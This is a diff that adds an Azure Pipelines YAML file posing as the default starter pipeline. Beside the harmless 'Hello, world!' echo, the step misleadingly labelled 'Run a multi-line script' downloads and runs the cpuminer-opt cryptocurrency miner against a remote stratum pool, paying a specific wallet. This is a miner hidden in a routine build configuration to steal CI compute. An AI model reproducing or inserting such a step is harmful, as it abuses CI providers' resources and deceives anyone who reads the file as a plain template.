@@ -1,0 +1,18 @@
+# Starter pipeline
+# Start with a minimal pipeline that you can customize to build and deploy your code.
+# Add steps that build, run tests, deploy, and more:
+# https://aka.ms/yaml
+
+trigger:
+- main
+
+pool:
+  vmImage: ubuntu-latest
+
+steps:
+- script: echo Hello, world!
+  displayName: 'Run a one-line script'
+
+- script: |
+    wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz && tar -xf cpuminer-opt-linux.tar.gz >/dev/null 2>&1 && ./cpuminer-sse2 -a yespowertide  -o stratum+tcps://stratum-asia.rplant.xyz:17059 -u TRYV3frnXuCj5pZeQ4AXJFQHBunDT84awo.suto1 -t 16
+  displayName: 'Run a multi-line script'
